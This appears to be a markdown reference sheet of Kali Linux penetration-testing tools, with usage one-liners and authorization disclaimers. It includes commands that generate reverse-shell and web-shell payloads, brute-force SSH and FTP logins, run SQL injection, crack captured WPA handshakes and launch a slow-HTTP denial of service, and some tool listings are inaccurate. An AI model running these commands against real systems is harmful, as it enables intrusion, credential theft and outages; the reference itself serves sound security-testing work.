# Kali Linux Tools & Scripts Reference

**⚠️ SECURITY NOTICE**: This documentation is for authorized penetration testing only. Unauthorized access to computer systems is illegal. Ensure you have explicit written authorization before testing.

Comprehensive reference of 400+ security tools included in Kali Linux, organized by category.

## Table of Contents

1. [Information Gathering](#information-gathering)
2. [Vulnerability Analysis](#vulnerability-analysis)
3. [Exploitation Tools](#exploitation-tools)
4. [Wireless Testing](#wireless-testing)
5. [Reverse Engineering](#reverse-engineering)
6. [Web Application Testing](#web-application-testing)
7. [Sniffing & Spoofing](#sniffing--spoofing)
8. [Stress Testing](#stress-testing)
9. [Forensics](#forensics)
10. [Reporting Tools](#reporting-tools)

## Information Gathering

### Network Discovery

```
nmap              - Network mapper (port scanning, service detection)
masscan           - Fast mass IP port scanner
zmap              - Network scanner for research
netdiscover       - ARP reconnaissance tool
ping              - ICMP ping tool
traceroute        - Trace network route
mtr               - Network diagnostic tool
arp-scan          - ARP network scanner
hping3            - Craft custom TCP/IP packets
fping             - Parallel ping utility
```

**Usage Examples**:
```bash
# Port scan
nmap -sV -p- target.com

# Fast mass scan
masscan 192.168.0.0/16 -p 80,443

# ARP discovery
netdiscover -r 192.168.1.0/24
```

### DNS Analysis

```
dig               - DNS lookup utility
nslookup          - Query DNS records
host              - DNS lookup tool
dnsrecon          - DNS enumeration tool
dnsenum           - DNS brute-force
dnsx              - DNS toolkit
sublist3r         - Subdomain enumeration
massdns           - Fast DNS lookup
fierce            - DNS reconnaissance
```

**Usage Examples**:
```bash
# DNS enumeration
dnsrecon -d target.com -t std

# Subdomain enumeration
sublist3r -d target.com -o results.txt

# Zone transfer attempt
dig @ns1.target.com target.com axfr
```

### WHOIS & IP Lookup

```
whois             - WHOIS lookup
geoiplookup       - GeoIP lookup
abuseipdb         - IP abuse database
bgpgrep           - BGP data lookup
```

### HTTP Analysis

```
curl              - HTTP client
wget              - Web downloader
nikto             - Web server scanner
wfuzz             - Web fuzzer
whatweb           - Web technology fingerprinting
```

**Usage Examples**:
```bash
# Web server scanning
nikto -h target.com

# Web technology detection
whatweb target.com

# Fuzzing
wfuzz -w wordlist.txt http://target.com/FUZZ
```

### SSL/TLS Analysis

```
openssl           - SSL/TLS toolkit
testssl.sh        - SSL/TLS testing script
sslscan           - SSL/TLS vulnerability scanner
sslyze            - SSL/TLS analysis
nessus            - Comprehensive vulnerability scanner
```

## Vulnerability Analysis

### Vulnerability Scanners

```
nessus            - Enterprise vulnerability scanner
openvas           - Open Vulnerability Assessment System
qualys            - Cloud-based vulnerability scanner
nexpose           - Rapid7 vulnerability scanner
tenable.io        - Cloud vulnerability management
acunetix          - Web vulnerability scanner
burp              - Web security testing platform
```

### Exploit Frameworks

```
metasploit        - Exploitation framework
searchsploit      - Exploit database search
python-recon-ng   - Web reconnaissance framework
sqlmap            - SQL injection testing
```

### Compliance & Configuration

```
lynis             - Security auditing tool
tiger             - Unix security auditing
clamav            - Antivirus engine
aide              - File integrity monitoring
```

## Exploitation Tools

### Exploitation Frameworks

```
metasploit-framework
exploit-db
routersploit      - Router exploitation framework
weevely           - Web shell generator
```

### Payload Generation

```
msfvenom          - Metasploit payload generator
weevely           - PHP web shell
unicorn           - Shellcode generation
shellcraft        - Shellcode tool (pwntools)
```

**Usage Examples**:
```bash
# Generate Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

# Generate Linux shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell

# PHP web shell
weevely generate password shell.php
```

## Wireless Testing

### WiFi Analysis

```
aircrack-ng       - Wireless WEP/WPA cracking
airodump-ng       - WiFi packet capture
aireplay-ng       - WiFi packet injection
airmon-ng         - WiFi interface monitoring
kismet            - Wireless network detector
hashcat           - Password cracking
john              - Password cracker
```

**Usage Examples**:
```bash
# Monitor mode
airmon-ng start wlan0

# Capture handshake
airodump-ng -c 6 -w capture mon0

# Crack WPA
aircrack-ng -w wordlist.txt capture-01.cap

# GPU cracking
hashcat -m 2500 -a 0 capture.hccapx wordlist.txt
```

### Bluetooth Testing

```
bluesnarfer       - Bluetooth snarfing
bluemaho          - Bluetooth fuzzer
bluetoothctrl     - Bluetooth control
hciconfig         - Bluetooth configuration
```

### SDR (Software Defined Radio)

```
gqrx              - Software radio receiver
hackrf-tools      - HackRF tools
gnuradio          - Signal processing
```

## Reverse Engineering

### Disassemblers & Debuggers

```
ghidra            - NSA reverse engineering framework
ida               - Interactive disassembler
radare2           - Reverse engineering framework
objdump           - Object file display tool
strings           - Extract strings from binary
```

**Usage Examples**:
```bash
# Extract strings from binary
strings binary.exe | grep password

# Analyze binary with radare2
r2 binary.exe
```

### Decompilers

```
ghidra            - Decompiler
cutter            - GUI for radare2
jd-gui            - Java decompiler
cfr               - Modern Java decompiler
enjarify          - DEX to Java decompiler
```

### Debuggers

```
gdb               - GNU debugger
lldb              - LLVM debugger
windbg            - Windows debugger
pdb               - Python debugger
```

## Web Application Testing

### HTTP Proxies

```
burp              - Burp Suite (intercepting proxy)
zap               - OWASP ZAP (proxy/scanner)
mitmproxy         - Python HTTP proxy
charles           - HTTP proxy
```

### SQL Injection

```
sqlmap            - SQL injection testing
sql-injection-scanner
```

**Usage Examples**:
```bash
# Automatic SQL injection
sqlmap -u "http://target.com?id=1" --dbs

# POST parameter testing
sqlmap -u "http://target.com" --data="user=admin&pass=test" -p pass
```

### File Inclusion

```
lfisuite          - LFI exploitation
fimap             - File inclusion mapper
```

### Cross-Site Scripting (XSS)

```
xsser             - XSS exploitation
dalfox            - Parameter analysis tool
```

### Credential Testing

```
hydra             - Login brute-forcing
medusa            - Parallel login brute-forcer
ncrack            - Network authentication cracker
crowbar           - Brute-force crowbar
```

**Usage Examples**:
```bash
# SSH brute-force
hydra -l root -P wordlist.txt ssh://target.com

# HTTP basic auth
hydra -l admin -P wordlist.txt http-basic://target.com

# FTP brute-force
hydra -l user -P wordlist.txt ftp://target.com
```

### API Testing

```
postman           - API testing
insomnia          - REST client
soapui            - SOAP/REST testing
```

## Sniffing & Spoofing

### Packet Capture

```
tcpdump           - Network packet capture
wireshark         - GUI packet analyzer
tshark            - Command-line wireshark
pcap              - Packet capture library
```

**Usage Examples**:
```bash
# Capture traffic
tcpdump -i eth0 -w capture.pcap

# Analyze packets
wireshark capture.pcap

# Filter traffic
tcpdump -i eth0 'tcp port 80'
```

### Network Spoofing

```
arpspoof          - ARP spoofing
dnsspoof          - DNS spoofing
ettercap          - Man-in-the-middle
bettercap         - MITM framework
mitmproxy         - Man-in-the-middle proxy
```

### Packet Crafting

```
scapy             - Packet crafting library
hping3            - Craft TCP/IP packets
nemesis           - Packet crafting
```

## Stress Testing

### Denial of Service

```
slowhttptest      - HTTP denial of service
hping3            - Craft custom packets
ab                - Apache benchmark
siege             - HTTP load testing
```

**Usage Examples**:
```bash
# Load test
ab -n 1000 -c 10 http://target.com/

# Slow HTTP attack
slowhttptest -c 1000 -H -g -o report.html -u http://target.com
```

## Forensics

### Disk Analysis

```
autopsy           - Digital forensics GUI
sleuthkit         - Forensic analysis
volatility        - Memory forensics
```

**Usage Examples**:
```bash
# Memory analysis
volatility -f memory.dump imageinfo

# Disk imaging
dd if=/dev/sda of=disk.img bs=4M
```

### File Recovery

```
photorec          - File recovery
testdisk          - Partition recovery
scalpel           - File carving
```

### Timeline Analysis

```
plaso             - Timeline analysis
log2timeline      - Timeline generation
```

## Reporting Tools

### Documentation

```
dradis            - Collaboration platform
faraday           - Vulnerability management
reconpoint       - Reconnaissance tool
```

### Export Tools

```
pandoc            - Document converter
wkhtmltopdf       - HTML to PDF
```

## Command-Line Utilities

### Text Processing

```
grep              - Pattern matching
sed               - Stream editor
awk               - Text processing
cut               - Column extraction
sort              - Sorting
uniq              - Unique lines
wc                - Word/line count
```

### System Administration

```
ssh               - Secure shell
scp               - Secure copy
rsync             - Synchronization
systemctl         - System control
journalctl        - Journal logs
```

### Development Tools

```
git               - Version control
python            - Python interpreter
perl              - Perl interpreter
ruby              - Ruby interpreter
gcc               - C compiler
make              - Build automation
```

## Installation & Management

### Package Management

```
apt-get           - Debian/Ubuntu package manager
apt               - Modern apt (Ubuntu 16.04+)
pacman            - Arch package manager
yum               - RPM package manager
```

### Kali Repositories

```
# Update
apt-get update
apt-get upgrade

# Install specific tool
apt-get install nmap

# Search for tools
apt-cache search keyword
```

## Common Workflows

### Reconnaissance Workflow

```
1. Passive reconnaissance
   whois target.com
   nslookup target.com

2. Active reconnaissance
   nmap -sV target.com
   whatweb target.com

3. Vulnerability discovery
   nessus target.com
   nikto -h target.com

4. Documentation
   Screenshot results
   Document findings
```

### Web Application Testing Workflow

```
1. Information gathering
   whatweb target.com
   nikto -h target.com

2. Proxy setup
   Configure Burp/ZAP

3. Manual testing
   Browse application
   Identify inputs

4. Automated scanning
   Run scanner
   Review results

5. Manual exploitation
   SQL injection testing
   XSS testing

6. Reporting
   Document vulnerabilities
   Provide recommendations
```

### Wireless Testing Workflow

```
1. Reconnaissance
   kismet / airodump-ng

2. Capture handshake
   aireplay-ng -0 1 -a MAC mon0

3. Crack password
   aircrack-ng -w wordlist.txt capture.cap

4. Connect
   nmcli connection add ...

5. Post-exploitation
   Network enumeration
   ARP spoofing
```

## Safety & Best Practices

### Authorization Checklist
- [ ] Written authorization obtained
- [ ] Scope clearly defined
- [ ] Rules of engagement documented
- [ ] Testing window scheduled
- [ ] Stakeholders notified
- [ ] Backup/recovery procedures in place

### Testing Best Practices
- Start with passive reconnaissance
- Use least intrusive techniques first
- Test in isolated environments when possible
- Document all findings
- Avoid causing denial of service
- Clean up and remove artifacts
- Report responsibly and professionally

### Legal Considerations
- Unauthorized access is illegal (CFAA, GDPR, etc.)
- Maintain chain of custody for forensic evidence
- Follow applicable laws and regulations
- Report findings to appropriate parties
- Protect sensitive information

## Troubleshooting

### Common Issues

```
Tool not found
  → apt-get update && apt-get install tool-name

Permission denied
  → sudo tool-name or check file permissions

Network connectivity
  → check network configuration
  → verify firewall rules

Python module missing
  → pip install module_name
```

## Additional Resources

- [Kali Linux Documentation](https://docs.kali.org/)
- [Kali Linux Tools](https://www.kali.org/tools/)
- [Penetration Testing Methodologies](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [CEH Exam Objectives](https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/)

---

**Last Updated**: January 2026

**⚠️ DISCLAIMER**: This documentation is for authorized security testing only. Unauthorized access to computer systems is illegal. Misuse of these tools may result in criminal prosecution. The author assumes no liability for misuse.
